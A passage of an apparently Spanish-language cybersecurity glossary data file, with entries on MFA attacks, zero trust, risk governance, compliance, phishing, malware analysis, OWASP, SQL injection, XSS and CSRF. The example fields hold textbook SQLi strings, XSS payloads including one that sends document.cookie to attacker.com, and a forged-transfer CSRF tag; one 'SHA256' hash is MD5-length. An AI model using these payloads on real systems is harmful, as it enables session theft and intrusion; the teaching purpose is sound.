      "• **Certificados** (mTLS, smart card, PIV/CAC) — típico en entornos regulados.\n" +
      "\n> ⚠️ **Trampa común:** \"passwordless\" no es lo mismo que \"MFA fuerte\". Un magic link vía email con la cuenta comprometida es **más débil** que contraseña + passkey.\n" +
      "> 💡 El objetivo no es la ausencia de contraseña sino que **no haya un secreto reusable** que pueda ser robado, phisheado o filtrado en una brecha.\n" +
      "\n**Retos:** recuperación (¿qué pasa si perdés el dispositivo?), account bootstrap, soporte cross-device y el pasillo de **downgrade** a método más débil.",
    examples: [
      "Login en Microsoft/Google con passkey: la contraseña queda como recovery-only.",
      "Slack: magic link como primer factor + passkey como segundo.",
      "Banca online con smart card + PIN → password-less pero MFA fuerte.",
    ],
    related: ["Passkeys y FIDO2/WebAuthn", "MFA y autenticación moderna", "Factores de autenticación", "Ataques a MFA"],
  },
  {
    id: 868,
    module: 83,
    term: "Autenticación adaptativa / basada en riesgo",
    short: "El sistema evalúa contexto en cada intento y decide dinámicamente: permitir, pedir step-up o bloquear.",
    detail:
      "En vez de aplicar la **misma política** a todos los logins, la auth adaptativa **puntúa el riesgo** de cada intento y **decide**:\n" +
      "\n**Señales típicas:**\n" +
      "• **Dispositivo** — reconocido, jailbroken, versión de SO, EDR presente.\n" +
      "• **Red** — IP corporativa, VPN, país nuevo, proxy/Tor.\n" +
      "• **Comportamiento** — hora habitual, ritmo, geo velocity imposible (login en Madrid y Tokio en 10 min).\n" +
      "• **Recurso** — un dashboard interno pesa menos que la consola de admin.\n" +
      "• **Identity Threat Intel** — credenciales filtradas, cuentas expuestas en dumps.\n" +
      "\n**Decisiones posibles:**\n" +
      "| Puntaje | Acción |\n" +
      "|---|---|\n" +
      "| Bajo | Login directo (SSO transparente) |\n" +
      "| Medio | Step-up: pedir un factor adicional (MFA, passkey) |\n" +
      "| Alto | Bloquear + alertar al SOC / obligar reset |\n" +
      "\n> 💡 **Conditional Access** de Entra ID y las policies de Okta / Ping son las implementaciones enterprise más maduras. Se combinan con **continuous authentication** (biometría comportamental durante la sesión).\n" +
      "> ⚠️ Cuidado: reglas mal calibradas generan **fricción excesiva** (usuarios evaden con VPN personal) o **falsa sensación** (permitir por IP corporativa cuando el atacante ya está adentro).",
    examples: [
      "Entra Conditional Access: si el usuario está fuera de la red corporativa Y accede al portal financiero → exigir passkey.",
      "Okta Risk Engine bloquea un login que viene de un país nuevo con un browser sin cookies.",
      "Session risk sube durante la sesión (comportamiento anómalo) → forzar re-login.",
    ],
    related: ["MFA y autenticación moderna", "Factores de autenticación", "Ciclo de vida de la identidad", "Ataques a MFA"],
  },
  {
    id: 869,
    module: 83,
    term: "Ataques a MFA",
    short: "Cómo se rompe MFA en el mundo real: fatiga, SIM swap, proxy phishing (AiTM), consent phishing e interceptación de push.",
    detail:
      "La MFA no es infalible. Los vectores más frecuentes:\n" +
      "\n**1. MFA fatigue / prompt bombing** — el atacante ya tiene la contraseña (dump o phishing) y **bombardea con pushes**. Un empleado cansado acepta uno. → **Uber (2022)** y **Cisco (2022)** cayeron por acá.\n" +
      "\n**2. SIM swapping** — el atacante convence al carrier de portar el número a su SIM y recibe los **SMS OTP**. Ataque clásico contra cripto y banca.\n" +
      "\n**3. Adversary-in-the-middle (AiTM) / proxy phishing** — herramientas como **evilginx** o **Modlishka** proxean el sitio real, capturan credenciales **y el token de sesión post-MFA**. TOTP y push SMS caen; **FIDO2/passkeys no** (origin binding).\n" +
      "\n**4. Consent phishing (illicit consent grant)** — no roba credenciales: engaña al usuario para que **conceda permisos OAuth** a una app maliciosa. Salta MFA porque no la necesita; obtiene tokens persistentes.\n" +
      "\n**5. Push interception / token replay** — apps mal implementadas, deeplinks abusables o malware en el móvil que aprueba el push sin interacción.\n" +
      "\n**Contramedidas:**\n" +
      "• **Number matching** en push (Microsoft, Google) — el usuario tipea un número mostrado en la pantalla.\n" +
      "• **FIDO2 / passkeys** obligatorias para admins y accesos privilegiados.\n" +
      "• **Bloqueo de SMS OTP** para cuentas de alto valor; migrar a app authenticator o passkey.\n" +
      "• **Consent governance** — revisar apps con permisos peligrosos, alertas por consentimientos nuevos.\n" +
      "• **Verified push** — atado a dispositivo confiable + señal de riesgo del contexto.\n" +
      "> 💡 La lección de Uber/Cisco: MFA débil + un solo usuario cansado = compromiso. FIDO2 corta esa cadena.",
    examples: [
      "Uber 2022: contractor pusheado hasta que aceptó → tokens robados → acceso a Slack, HackerOne, etc.",
      "Reddit 2023: empleados cayeron en AiTM phishing; passkeys mitigan.",
      "Cripto: SIM swap masivo en 2020–2022 vaciando cuentas con solo SMS 2FA.",
    ],
    related: ["MFA y autenticación moderna", "Passkeys y FIDO2/WebAuthn", "Factores de autenticación", "Ingeniería social", "Defensas anti-phishing"],
  },

  // ── M84 · Arquitectura de Seguridad y Patrones de Diseño ─────────────────
  {
    id: 870,
    module: 84,
    term: "Principios de diseño seguro",
    short: "Las máximas que guían toda arquitectura: defensa en profundidad, fail-safe, menor privilegio.",
    detail:
      "Los principios clásicos (Saltzer & Schroeder + acumulado moderno) son la brújula:\n" +
      "• **Defensa en profundidad** — capas; ningún control único debe ser fatal.\n" +
      "• **Fail-safe defaults** — denegar por defecto; abrir explícito.\n" +
      "• **Menor privilegio** — solo lo necesario, el menor tiempo posible.\n" +
      "• **Separación de responsabilidades** — ninguna acción crítica en manos de uno solo.\n" +
      "• **Mecanismo económico** — simple es más auditable que clever.\n" +
      "> 💡 Lo no listado: no inventar tu propia cripto y minimizar superficie.",
    examples: [
      "Permisos en una API: deny by default y allow explícito.",
      "Separar quien aprueba un pago de quien lo ejecuta.",
    ],
    related: ["Defensa en profundidad", "Patrones de diseño seguro", "Zero Trust Architecture"],
  },
  {
    id: 871,
    module: 84,
    term: "Patrones de diseño seguro",
    short: "Soluciones reutilizables: gatekeeper, broker, reverse proxy, BFF, valet key.",
    detail:
      "Patrones recurrentes:\n" +
      "• **Gatekeeper / API Gateway** — punto único que valida, autentica y enruta.\n" +
      "• **Broker** — desacopla cliente y backend; permite cambiar la implementación.\n" +
      "• **Reverse proxy + WAF** — protege la app y centraliza TLS/headers.\n" +
      "• **BFF (Backend For Frontend)** — un backend por canal, evita exponer toda la API al móvil/web.\n" +
      "• **Valet key** — token de un solo uso para acceso temporal a un recurso.\n" +
      "> 💡 La intención: aislar la complejidad y poner el control en lugares **chequeables**.",
    examples: [
      "Un BFF para la app móvil que filtra qué expone del backend.",
      "API Gateway con throttling, auth y observabilidad centralizadas.",
    ],
    related: ["Principios de diseño seguro", "Zero Trust Architecture", "Headers de seguridad"],
  },
  {
    id: 872,
    module: 84,
    term: "Zero Trust Architecture",
    short: "Nunca confiar, siempre verificar: cada acceso evalúa identidad, dispositivo y contexto.",
    detail:
      "El modelo clásico (perímetro confiable, dentro libre) ya no funciona. **Zero Trust** (NIST SP 800-207) parte de **'asumir brecha'** y exige verificación **en cada acceso**: quién (identidad fuerte), desde dónde (dispositivo conforme), a qué (recurso concreto), bajo qué condiciones (contexto, riesgo). No hay 'dentro' implícito.\n" +
      "> 💡 Pasar a Zero Trust no es un producto: es un **viaje** que va eliminando la confianza implícita pieza por pieza. Ver el diagrama 'Pilares de Zero Trust'.",
    examples: [
      "Acceso a una app condicionado a postura del dispositivo + MFA.",
      "Eliminar VPN clásica a favor de un broker ZTNA.",
    ],
    related: ["Principio de mínimo privilegio", "Microsegmentación", "Principios de diseño seguro"],
  },
  {
    id: 873,
    module: 84,
    term: "Microsegmentación",
    short: "Segmentar más allá de la red plana: cada workload en su microperímetro con políticas explícitas.",
    detail:
      "La **microsegmentación** lleva la idea de DMZ a su límite: cada **workload** (VM, contenedor, pod) opera en un **microperímetro** con reglas explícitas de quién puede hablar con quién. Limita drásticamente el **movimiento lateral**: comprometer una pieza no abre la puerta al resto.\n" +
      "> 💡 Es la materialización de Zero Trust a nivel de red — políticas declarativas que viajan con la carga.",
    examples: [
      "NetworkPolicies de Kubernetes aislando el frontend del backend.",
      "Segmentación east-west en data center con políticas L7.",
    ],
    related: ["Zero Trust Architecture", "DMZ y segmentación de red", "Defensa contra el movimiento lateral"],
  },
  {
    id: 874,
    module: 84,
    term: "Marcos de arquitectura (SABSA, NIST, TOGAF)",
    short: "Marcos que estructuran el diseño: del 'por qué' del negocio al 'cómo' técnico.",
    detail:
      "Para que la arquitectura sea coherente y trazable, se apoyan en marcos:\n" +
      "| Marco | Enfoque |\n" +
      "|---|---|\n" +
      "| SABSA | Capas desde 'contextual' (negocio) a 'componente' (técnica) |\n" +
      "| NIST CSF | Funciones (Govern, Identify, Protect, Detect, Respond, Recover) |\n" +
      "| TOGAF | Arquitectura empresarial general |\n" +
      "> 💡 SABSA es de los más usados para diseñar seguridad **alineada al negocio**.",
    examples: [
      "Mapear capacidades del negocio a controles con NIST CSF.",
      "Diseñar con SABSA garantizando trazabilidad del 'por qué' al 'cómo'.",
    ],
    related: ["Principios de diseño seguro", "NIST Cybersecurity Framework (CSF)", "Gobernanza de seguridad"],
  },

  // ── M85 · Gobernanza y Gestión de Riesgos ────────────────────────────────
  {
    id: 880,
    module: 85,
    term: "Gobernanza de seguridad",
    short: "Quién decide qué, con qué autoridad: el marco que alinea seguridad con la dirección.",
    detail:
      "La **gobernanza** establece **quién manda en qué** (CISO, comités, RACI), define el **apetito y la tolerancia al riesgo**, aprueba políticas y revisa métricas. Es lo que separa una función de seguridad **estratégica** (con voz en la dirección) de una **reactiva** (apagar fuegos).\n" +
      "> 💡 Apetito de riesgo: cuánto riesgo está dispuesta a aceptar la organización para perseguir objetivos. Sin él, todo decision es ad hoc.",
    examples: [
      "Un comité de riesgo de TI que aprueba la matriz anual.",
      "Una política aprobada por el CEO que el CISO ejecuta.",
    ],
    related: ["Gestión de riesgos"],
  },
  {
    id: 881,
    module: 85,
    term: "Identificación y análisis de riesgos",
    short: "Listar lo que puede salir mal y medir cuánto importa — cualitativo o cuantitativo.",
    detail:
      "Identificar riesgos cataloga **amenazas × vulnerabilidades × activos**. El análisis los **valora**:\n" +
      "• **Cualitativo** — matriz probabilidad × impacto (Alto/Medio/Bajo).\n" +
      "• **Cuantitativo** — **ALE** = SLE × ARO (pérdida anual esperada).\n" +
      "• **FAIR** — combina ambos con factores explícitos.\n" +
      "> 💡 Para PyMEs y comunicación con dirección: cualitativo. Para decisiones de gran inversión: cuantitativo.",
    examples: [
      "Matriz 5x5 de riesgos del trimestre.",
      "Calcular el ALE de un escenario de ransomware.",
    ],
    related: ["Amenaza, Vulnerabilidad y Riesgo", "Tratamiento del riesgo", "Gobernanza de seguridad"],
  },
  {
    id: 882,
    module: 85,
    term: "Tratamiento del riesgo",
    short: "Para cada riesgo: mitigar, transferir, aceptar o evitar — y registrar la decisión.",
    detail:
      "Tras valorar, hay **cuatro estrategias**:\n" +
      "| Estrategia | Cuándo |\n" +
      "|---|---|\n" +
      "| Mitigar | Reducir con controles |\n" +
      "| Transferir | Seguro, outsourcing |\n" +
      "| Aceptar | El control cuesta más que el daño |\n" +
      "| Evitar | Eliminar la actividad que lo genera |\n" +
      "Toda decisión queda en el **registro de riesgos**, firmada por el **risk owner**.\n" +
      "> 💡 Aceptar un riesgo NO es ignorarlo: es decidirlo conscientemente, con responsable y revisión.",
    examples: [
      "Aceptar un riesgo bajo en un sistema que se retira en 6 meses.",
      "Transferir el riesgo de fraude con un ciberseguro.",
    ],
    related: ["Identificación y análisis de riesgos", "Gestión de riesgos", "Metodologías de riesgo"],
  },
  {
    id: 883,
    module: 85,
    term: "Metodologías de riesgo",
    short: "ISO 27005, NIST RMF y MAGERIT: los marcos estándar para hacerlo de forma defendible.",
    detail:
      "Marcos consolidados:\n" +
      "• **ISO/IEC 27005** — gestión de riesgos en el contexto de un SGSI (ISO 27001).\n" +
      "• **NIST RMF / SP 800-37** — el marco federal de EE.UU., con foco en ciclo completo.\n" +
      "• **MAGERIT** — referente en sector público español.\n" +
      "• **OCTAVE / FAIR** — alternativas más cualitativas/cuantitativas.\n" +
      "Todos comparten el ciclo: **contexto → identificar → analizar → evaluar → tratar → monitorear**. Ver el diagrama 'Ciclo de gestión de riesgos'.",
    examples: [
      "Usar ISO 27005 como base del proceso de la empresa.",
      "MAGERIT para una administración pública española.",
    ],
    related: ["Tratamiento del riesgo", "ISO/IEC 27001", "NIST Cybersecurity Framework (CSF)"],
  },

  // ── M86 · Cumplimiento Normativo y Auditoría ─────────────────────────────
  {
    id: 890,
    module: 86,
    term: "Marcos regulatorios clave",
    short: "RGPD, HIPAA, PCI-DSS, SOC 2: qué proteger según sector y geografía.",
    detail:
      "Los marcos más extendidos:\n" +
      "| Marco | Foco |\n" +
      "|---|---|\n" +
      "| RGPD / GDPR | Datos personales (UE) |\n" +
      "| HIPAA | Datos sanitarios (EE.UU.) |\n" +
      "| PCI-DSS | Pagos con tarjeta |\n" +
      "| SOC 2 | Servicios SaaS (confianza) |\n" +
      "| NIS2 / DORA | Infraestructura crítica / finanzas (UE) |\n" +
      "> ⚠️ El **RGPD** llega hasta sanciones del **4% de la facturación global** — es alineación de incentivos, no un papel.",
    examples: [
      "Un SaaS B2B obteniendo el informe SOC 2 Type II.",
      "Un comercio cumpliendo PCI-DSS para procesar tarjetas.",
    ],
    related: ["ISO/IEC 27001", "Proceso de auditoría"],
  },
  {
    id: 891,
    module: 86,
    term: "ISO 27001, SGSI y SoA",
    short: "El SGSI es el sistema vivo; la SoA dice qué controles aplican y por qué.",
    detail:
      "**ISO/IEC 27001** define un **SGSI** basado en el ciclo **PDCA** (Plan-Do-Check-Act) y la gestión de riesgos. Su **Anexo A** lista controles de referencia (revisión 2022: 93 controles en 4 dominios). La **Declaración de Aplicabilidad (SoA)** justifica **cuáles aplican** y cuáles no, **y por qué** — es el documento estrella de la auditoría.\n" +
      "> 💡 Certificarse no es 'tenerlo todo'; es demostrar un sistema **vivo** y trazable. La SoA es la pieza más mirada por el auditor externo.",
    examples: [
      "PDCA: revisar el SGSI tras cada incidente relevante.",
      "Documentar en la SoA por qué se excluye un control concreto.",
    ],
    related: ["Marcos regulatorios clave", "Proceso de auditoría", "ISO/IEC 27001"],
  },
  {
    id: 892,
    module: 86,
    term: "Proceso de auditoría",
    short: "Planificación → trabajo de campo → reporte → seguimiento; con evidencia objetiva en cada paso.",
    detail:
      "Una auditoría sigue cuatro fases:\n" +
      "1. **Planificación** — alcance, criterios, equipo, plan de muestreo.\n" +
      "2. **Trabajo de campo** — entrevistas, revisión de evidencias, pruebas.\n" +
      "3. **Reporte** — hallazgos clasificados (mayor / menor / observación / oportunidad).\n" +
      "4. **Seguimiento** — verificar el cierre de las acciones correctivas.\n" +
      "> 💡 Auditoría **interna** (mejora) y **externa** (certificación) tienen lógicas distintas pero el mismo método: **evidencia objetiva**.",
    examples: [
      "Plan de muestreo de logs y registros del trimestre.",
      "Acta de cierre tras verificar las no conformidades.",
    ],
    related: ["ISO 27001, SGSI y SoA", "Marcos regulatorios clave", "Políticas y no conformidades"],
  },
  {
    id: 893,
    module: 86,
    term: "Políticas y no conformidades",
    short: "Las políticas marcan el 'qué'; las no conformidades son brechas entre lo escrito y lo hecho.",
    detail:
      "La **jerarquía documental** clásica:\n" +
      "• **Política** — qué y por qué (firmada por dirección).\n" +
      "• **Norma** — qué nivel de cumplimiento exigir.\n" +
      "• **Procedimiento** — cómo hacerlo.\n" +
      "• **Registro/Evidencia** — prueba de que se hizo.\n" +
      "Una **no conformidad** es la **brecha** entre lo escrito y lo ejecutado. Se clasifica (mayor/menor), se trata con un **plan de acciones correctivas** y se sigue hasta el cierre.\n" +
      "> ⚠️ Una política sin evidencia es papel mojado en una auditoría.",
    examples: [
      "Política de contraseñas + procedimiento + logs de cumplimiento.",
      "No conformidad: la política exige MFA y un sistema crítico no lo tiene.",
    ],
    related: ["Proceso de auditoría", "ISO 27001, SGSI y SoA", "Gobernanza de seguridad"],
  },

  // ── M34 · Ingeniería Social y Phishing ──────────────────────────────────
  {
    id: 376,
    module: 34,
    term: "Ingeniería Social",
    short: "Manipulación psicológica para explotar la naturaleza social humana y revelar información sensible.",
    detail:
      "La **ingeniería social** es la explotación de la **psicología humana** en vez de vulnerabilidades técnicas. Es más efectiva porque **el factor humano es impredecible**. Principios clave:\n" +
      "• **Confianza** — el atacante se gana la credibilidad fingiendo ser alguien de autoridad, colegas o soporte.\n" +
      "• **Urgencia** — crea presión de tiempo (\"tu cuenta será bloqueada en 1 hora\").\n" +
      "• **Miedo** — toca temas emocionales (pérdida de datos, castigo, fraude).\n" +
      "• **Reciprocidad** — \"si te ayudo, me ayudas\"; el atacante ofrece algo primero.\n" +
      "> ⚠️ No hay firewall que defienda contra la manipulación. La defensa es **conciencia y formación**.",
    examples: [
      "Llamar suplantando IT: \"necesito verificar tu contraseña por seguridad\".",
      "Email fingiendo ser el director: \"transfiere dinero para pagar una factura urgente\".",
      "USB plantado en el parking con etiqueta \"salarios 2025\".",
    ],
    related: ["Phishing", "Pretexting", "Principios de seguridad humana"],
  },
  {
    id: 377,
    module: 34,
    term: "Phishing",
    short: "Ataque por email/SMS/web que suplanta una entidad de confianza para robar credenciales o datos.",
    detail:
      "**Phishing** = **fishing** (pesca) con anzuelo cibernetico. El atacante lanza un email masivo esperando que alguien pique. Tipos:\n" +
      "| Tipo | Blanco | Técnica |\n" +
      "|---|---|---|\n" +
      "| Phishing (masivo) | Usuarios genéricos | Email fake de banco / PayPal / Google |\n" +
      "| Spearphishing | Objetivo específico | Email personalizado al gerente de finanzas |\n" +
      "| Whaling | C-suite (CEO, CFO) | Email de confianza (junta directiva) pidiendo transferencia |\n" +
      "| Smishing | SMS | \"Tu tarjeta fue comprometida. Haz clic aquí\" |\n" +
      "| Vishing | Llamada telefónica | \"Soy del banco, verifica tu PIN\" |\n" +
      "> 💡 El **indicador técnico clave** es la URL: verifica el dominio real en la barra de direcciones, no en el texto del link.",
    examples: [
      "Email falso de Amazon solicitando \"re-validar tu contraseña\".",
      "SMS de un operador: \"Debes pagar una factura. Entra en este enlace\" → URL falsa.",
      "Whaling: Email que suplanta al CEO pidiendo pagos urgentes (BEC scam).",
    ],
    related: ["Ingeniería Social", "Indicadores de compromiso", "Defensa contra phishing"],
  },
  {
    id: 378,
    module: 34,
    term: "Pretexting",
    short: "Crear una historia ficticia convincente (pretexto) para ganar confianza y acceder a información.",
    detail:
      "**Pretexting** es la creación de un **escenario falso** que suena creíble. No es masivo (phishing) sino dirigido. Ejemplos clásicos:\n" +
      "• \"Soy del IT support, tu máquina tiene un virus.\"\\n" +
      "• \"Soy del banco, necesito verificar algunos datos.\"\\n" +
      "• \"Soy un nuevo empleado en finanzas, ¿cómo se solicitan reportes?\"\\n" +
      "La clave es que el **pretexto es situacionalmente creíble** — usa jerga interna, nombres reales de departamentos, etc. Se recopila este **OSINT** previo del objetivo.",
    examples: [
      "Llamar suplantando a un colega para pedir acceso a una carpeta compartida.",
      "Email desde un email falso pero similar al del proveedor de la empresa.",
    ],
    related: ["Ingeniería Social", "OSINT", "Recopilación de información"],
  },
  {
    id: 379,
    module: 34,
    term: "Ataques de credenciales",
    short: "Robo, adivinanza o reutilización de credenciales para acceder a cuentas.",
    detail:
      "El **acceso a credenciales válidas** es la entrada más común (post-breach): \n" +
      "• **Credential stuffing** — intenta credenciales (user:pass) de un breach previo en otro sitio.\n" +
      "• **Fuerza bruta** — itera contraseñas comunes (123456, password, etc.).\n" +
      "• **Reutilización de credenciales** — mismo usuario y pass en múltiples sitios.\n" +
      "• **Obtención via phishing** — el usuario es engañado y entra su credencial en un sitio falso.\n" +
      "> ⚠️ El 81% de violaciones involucran **credenciales débiles o reutilizadas** (Verizon DBIR 2023).",
    examples: [
      "LinkedIn breach (600M) expone user:pass, atacante intenta en Gmail con mismo combo.",
      "Diccionario masivo de 10M contraseñas comunes contra un servidor SSH abierto.",
      "Email phishing fingiendo Office 365, usuario entra credenciales que se capturan.",
    ],
    related: ["Phishing", "Gestión de contraseñas", "Autenticación multifactor"],
  },

  // ── M35 · Análisis de Malware ──────────────────────────────────────────
  {
    id: 386,
    module: 35,
    term: "Malware",
    short: "Software malicioso diseñado para dañar, espiar, controlar o extraer datos.",
    detail:
      "**Malware** = **malicious software**. Categorías por **intención**:\n" +
      "| Tipo | Intención | Ejemplos |\n" +
      "|---|---|---|\n" +
      "| Virus | Reproducción destructiva | Borra archivos, corrompe boot |\n" +
      "| Gusano | Autorreplicación en red | Conficker, Morris worm |\n" +
      "| Troyano | Acceso remoto / backdoor | Trickbot (banking), RAT |\n" +
      "| Ransomware | Cifra datos y extorsión | Wannacry, REvil |\n" +
      "| Spyware | Vigilancia silenciosa | Keylogger, screenshot stealer |\n" +
      "| Adware | Publicidad invasiva / rastreo | Browser hijack |\n" +
      "| Rootkit | Acceso privilegiado persistente | Kernel-mode trojan |\n" +
      "| Botnet | Control remoto masivo | Mirai, Zeus |\n" +
      "> 💡 Un malware puede ser **polimorfo** (cambia su código) o **metamórfico** (reescribe su estructura).",
    examples: [
      "Ransomware LockBit cifra archivos empresariales y pide $2M rescate.",
      "RAT Agent Tesla instalado via correo → keylogger + credential stealer.",
    ],
    related: ["Análisis estático vs dinámico", "Indicadores de compromiso", "Respuesta ante incidentes"],
  },
  {
    id: 387,
    module: 35,
    term: "Análisis estático vs dinámico",
    short: "Estático: examina el archivo sin ejecutarlo (reverse engineer). Dinámico: ejecuta y monitorea comportamiento.",
    detail:
      "**Análisis estático**:\n" +
      "• Lee bytecode / ensamblador sin ejecutar.\n" +
      "• Herramientas: IDA Pro, Ghidra, objdump, strings.\n" +
      "• Ventajas: seguro, rápido, detalla la lógica completa.\n" +
      "• Desventajas: código ofuscado / empaquetado es opaco; no detecta comportamiento de runtime.\n" +
      "\\n**Análisis dinámico**:\n" +
      "• Ejecuta el malware en sandbox aislado y observa syscalls, red, filesystem.\n" +
      "• Herramientas: Wireshark, ProcMon, Cuckoo, Any.run.\n" +
      "• Ventajas: revela comportamiento real, detecta técnicas anti-análisis.\n" +
      "• Desventajas: el malware puede detectar sandbox y no ejecutar; requiere entorno seguro.\n" +
      "> 💡 **Análisis híbrido**: primero estático (rápido), si es sospechoso luego dinámico (detalle).",
    examples: [
      "IDA Pro desensambla un RAT y muestra direcciones C2 en strings.",
      "Cuckoo ejecuta malware y captura 47 procesos spawned + intentos de conexión a IP maliciosa.",
    ],
    related: ["Malware", "Sandboxing", "Indicadores de compromiso"],
  },
  {
    id: 388,
    module: 35,
    term: "Empaquetado y ofuscación",
    short: "Técnicas de anti-análisis que ocultan el código: comprime, cifra o ofusca el ejecutable.",
    detail:
      "Atacantes usan estas técnicas para evadir **análisis estático y antivirus**:\n" +
      "• **Empaquetado** — comprime el binario original bajo un stub decompressor (UPX, ASPack). El código original **no es visible** hasta runtime.\n" +
      "• **Ofuscación** — reescribe código de forma lógicamente equivalente pero incomprehensible (variables renombradas, saltos condicionales absurdos).\n" +
      "• **Cifrado** — cifra el payload y lo descifra en memoria en runtime.\n" +
      "• **Anti-debugging** — detecta si está siendo debuggeado (IsDebuggerPresent, trap flags) y se autodestruye.\n" +
      "> ⚠️ El análisis **estático** falla. Requiere **desenpacar en memoria** (volcar la memoria durante ejecución en sandbox) o **dynamic hooking** de syscalls.",
    examples: [
      "UPX empaquetar un troyan: el archivo pesa 50 KB empaquetado, 500 KB una vez desempaquetado.",
      "Emotet ofusca su código C2 communication: al análisis estático se ve ilegible, pero en runtime decrypta y envia datos.",
    ],
    related: ["Análisis estático vs dinámico", "Detección de malware", "Ingeniería inversa"],
  },
  {
    id: 389,
    module: 35,
    term: "Indicadores de compromiso (IOC)",
    short: "Artefactos técnicos que evidencian la presencia de malware o actividad maliciosa.",
    detail:
      "Un **IOC** es una **pista digital** que permite detectar un incidente:\n" +
      "| IOC | Ejemplos |\n" +
      "|---|---|\n" +
      "| Hash | MD5/SHA1/SHA256 del malware |\n" +
      "| IP/Dominio | Dirección C2 (command & control) |\n" +
      "| URL | Servidor de payload / exfiltración |\n" +
      "| Comportamiento | Creación de reg. de persistencia, conexión a puerto X |\n" +
      "| Mutantes | Rutas de fichero, procesos, mutex que usa el malware |\n" +
      "| YARA rule | Regla que matchea patrones del código |\n" +
      "> 💡 IOCs **públicos** (de incidentes previos) alimentan antivirus y SIEM. Los **privados** (de tu red) son oro para forensics.",
    examples: [
      "Hash SHA256: 5d41402abc4b2a76b9719d911017c592 → VirusTotal: 58/70 detectores positivos.",
      "Dominio C2: evil.ru — agregarlo a firewall + DNS sinkhole bloquea comunicación malware.",
    ],
    related: ["Análisis de malware", "Threat intelligence", "Threat hunting"],
  },

  // ── M36 · Seguridad en Aplicaciones Web ──────────────────────────────────
  {
    id: 395,
    module: 36,
    term: "OWASP Top 10",
    short: "Clasificación de los 10 riesgos de seguridad más críticos en aplicaciones web.",
    detail:
      "OWASP (Open Web Application Security Project) publica cada 3-4 años un ranking de amenazas reales. **Top 10 2021** (vigente):\n" +
      "1. **Broken Access Control** — falta de validación de permisos; un usuario accede a datos de otro.\n" +
      "2. **Cryptographic Failures** — datos sensibles expuestos (sin cifrado, protocolos débiles).\n" +
      "3. **Injection** — SQLi, XML, LDAP; entrada no sanitizada permite inyectar código.\n" +
      "4. **Insecure Design** — arquitectura sin defensas (sin rate limiting, sin validación).\n" +
      "5. **Security Misconfiguration** — default credentials, servicios innecesarios, información sensible expuesta.\n" +
      "6. **Vulnerable Components** — uso de librerías obsoletas con CVEs.\n" +
      "7. **Authentication Failures** — credenciales débiles, sesión insegura, MFA ausente.\n" +
      "8. **Data Integrity Failures** — CI/CD comprometida, sin validación de signatures.\n" +
      "9. **Logging & Monitoring Failures** — ausencia de logs; no se detectan incidentes.\n" +
      "10. **SSRF (Server-Side Request Forgery)** — servidor hace request a URL atacante-controlada.\n" +
      "> 💡 El 94% de incidentes involucran temas del OWASP Top 10.",
    examples: [
      "M1: Cambiar ?user=123 a ?user=456 accede a otro perfil.",
      "M3: Login form vulnerable a SQLi: admin' OR '1'='1.",
    ],
    related: ["SQLi", "XSS", "CSRF", "Validación de entrada"],
  },
  {
    id: 396,
    module: 36,
    term: "SQL Injection (SQLi)",
    short: "Insertar código SQL malicioso en un campo de entrada para ejecutar queries no autorizadas.",
    detail:
      "**SQLi** es el ataque **M3** del OWASP Top 10. Ocurre cuando la aplicación **concatena entrada del usuario directamente en una query SQL**:\n" +
      "```sql\n" +
      "query = \"SELECT * FROM users WHERE username='\" + user_input + \"' AND password='\" + pass_input + \"'\";\n" +
      "```\n" +
      "Si user_input = `admin' --`, la query se convierte en:\n" +
      "```sql\n" +
      "SELECT * FROM users WHERE username='admin' --' AND password='...';\n" +
      "```\n" +
      "El `--` comenta el resto, saltando la validación de contraseña. **Defensa**:\n" +
      "• **Prepared Statements** — separar SQL de datos (parámetros vinculados).\n" +
      "• **ORM** — abstracción que valida automáticamente.\n" +
      "• **WAF** — detección de patrones SQLi (signatures).\n" +
      "• **Validación de entrada** — whitelist de caracteres permitidos.",
    examples: [
      "Login: username = `' OR '1'='1` → acceso sin contraseña.",
      "Union-based SQLi: `UNION SELECT table_name FROM information_schema.tables` → enumerar BD.",
    ],
    related: ["Validación de entrada", "Inyección de código", "WAF (Web Application Firewall)"],
  },
  {
    id: 397,
    module: 36,
    term: "Cross-Site Scripting (XSS)",
    short: "Inyectar código JavaScript malicioso en una página web para ejecutar en el navegador del usuario.",
    detail:
      "**XSS** es la inyección de **script client-side** en una página. Tipos:\n" +
      "| Tipo | Mecanismo | Impacto |\n" +
      "|---|---|---|\n" +
      "| Reflected | ?param=<script>alert(1)</script> → el servidor refleja el input en HTML | Cookie/session stealer |\n" +
      "| Stored | Input malicioso guardado en BD → afecta a **todos** los que visiten | Worm, trojan, cuenta hijack |\n" +
      "| DOM | JavaScript manipula el DOM mal validando entrada | Similar a Reflected |\n" +
      "El **DOM XSS** es moderno: `document.innerHTML = userInput` sin sanitizar permite inyectar tags.\n" +
      "**Defensa**:\n" +
      "• **Sanitización** — remove tags peligrosos (<script>, event handlers).\n" +
      "• **Encoding** — `<` → `&lt;`, `>` → `&gt;`.\n" +
      "• **Content Security Policy (CSP)** — header que dice qué scripts son permitidos.\n" +
      "• **Validación servidor-side** — NUNCA confíes en el cliente.",
    examples: [
      "Searched for: <img src=x onerror=alert('XSS')> → alerta en todos los resultados.",
      "Stored XSS en comentario de blog: <script>fetch('https://attacker.com?cookie=' + document.cookie)</script>.",
    ],
    related: ["Validación de entrada", "Content Security Policy", "OWASP Top 10"],
  },
  {
    id: 398,
    module: 36,
    term: "Cross-Site Request Forgery (CSRF)",
    short: "Forzar a un usuario autenticado a ejecutar acciones no deseadas sin su consentimiento.",
    detail:
      "**CSRF** explota el hecho de que el navegador envía **cookies automáticamente** con cada request al mismo dominio:\n" +
      "1. Usuario autenticado en bank.com (cookie de sesión almacenada).\n" +
      "2. Usuario **sin cerrar sesión** visita evil.com.\n" +
      "3. evil.com contiene: `<img src='https://bank.com/transfer?to=attacker&amount=1000'>`\n" +
      "4. El navegador **automáticamente** envía la cookie, ejecutando la transferencia.\n" +
      "**Defensa**:\n" +
      "• **CSRF token** — servidor genera un token único por sesión, incluido en cada form. Si el token es inválido, rechaza.\n" +
      "• **SameSite cookie** — atributo que previene que cookies se envíen en requests cross-site.\n" +
      "• **Double Submit cookie** — compara token en cookie vs token en form.\n" +
      "• **Validar Referer header** — acepta solo requests de tu dominio.",
    examples: [
      "Email con <img>: \"Haz clic para ver tu facturas\" → en realidad ejecuta una DELETE del perfil.",
      "Sitio invasivo con 1x1 pixel que intenta cambiar contraseña en un router comprometido.",
    ],
    related: ["Validación de entrada", "Seguridad de sesión", "CsrfBridge (AlphaLog)"],
  },
  {
    id: 399,
    module: 36,
    term: "Validación de entrada",
    short: "Verificar que los datos ingresados por el usuario sean válidos antes de procesarlos.",
    detail:
